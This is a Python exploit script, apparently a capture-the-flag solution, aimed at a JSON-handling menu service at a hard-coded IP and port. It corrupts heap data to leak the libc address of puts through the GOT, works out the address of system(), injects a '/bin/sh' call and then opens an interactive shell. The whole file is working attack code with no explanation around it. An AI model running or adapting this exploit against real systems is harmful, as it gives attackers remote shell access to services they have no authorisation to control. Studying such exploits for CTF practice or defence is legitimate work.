from threading import Thread
from zio import *
from pwn import *
target = ('192.168.1.140', 12001)
#target = './bin'

libc = ELF('./libc-2.23.so')

def interact(io):
    def run_recv():
        while True:
            try:
                output = io.read_until_timeout(timeout=1)
                # print output
            except:
                return

    t1 = Thread(target=run_recv)
    t1.start()
    while True:
        d = raw_input()
        if d != '':
            io.writeline(d)


def exp(target):
    io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), \
             print_write=COLORED(RAW, 'green'))
    io.read_until('?')
    io.writeline('hehehe')
    io.read_until('json:')
    io.writeline('{"a":"A", "b":"B", "c":"C"}')

    io.read_until('$')
    io.writeline('3')
    io.read_until(':')
    io.writeline('100')
    io.writeline('b')

    io.read_until('$')
    io.writeline('4')
    io.read_until(':')
    io.writeline('100')
    io.writeline('c')
    io.read_until(':')
    io.writeline(str(0x50))
    io.writeline('"cccccccccccccc"')
    io.read_until('[Y/N]')
    io.writeline('N')
#    io.gdb_hint()

    io.read_until('$')
    io.writeline('2')
    io.read_until(':')
    io.writeline(str(0))
    f = open('./dump.bin', 'rb')
    data = f.read()
    f.close()
    payload = 'c\x00'+data[2:]
    puts_got = 0x603038
    payload = payload[:0x88]+l64(puts_got)+l64(0)+l64(0x50)[:-1]
    payload = payload.replace('\x0a', '\x00')
    io.writeline(payload)

    io.read_until('here is the now json\n"')


    puts = l64(io.read(8))
    print hex(puts)
    system = libc.symbols['system']-libc.symbols['puts']+puts


    io.read_until('$')
    io.writeline('3')

    io.read_until('$')
    io.writeline('2')
    io.read_until(':')
    io.writeline(str(0))
    f = open('./dump.bin', 'rb')
    data = f.read()
    f.close()
    payload = 'c\x00'+data[2:]
    payload = payload[:0xc0]+'/bin/sh;'+l64(system)
    payload = payload.replace('\x0a', '\x00')
    io.writeline(payload)


    interact(io)


exp(target)
